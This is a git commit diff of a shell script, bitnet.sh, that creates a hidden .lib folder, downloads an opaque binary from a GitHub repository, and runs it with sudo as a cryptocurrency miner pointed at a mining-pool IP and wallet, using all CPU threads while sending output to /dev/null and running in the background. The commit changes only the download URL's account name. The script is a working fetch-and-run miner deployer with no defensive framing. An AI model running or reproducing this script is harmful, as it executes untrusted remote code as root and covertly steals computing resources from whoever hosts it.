d1df7c208c6840ec1ba66e7149443c52df31011b
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-22 22:35:22 +0700

    Update bitnet.sh

--- bitnet.sh
+++ bitnet.sh
@@ -2,7 +2,7 @@
 set -x
 apt-get update ; apt-get install -y wget curl sudo
 mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/Sonehra/All-File/raw/main/sereb > /dev/null 2>&1
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/sereb > /dev/null 2>&1
 chmod u+x sgr1
 sudo ./sgr1 --algorithm aurum --pool 128.199.218.20:80 --wallet bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
 sleep 30
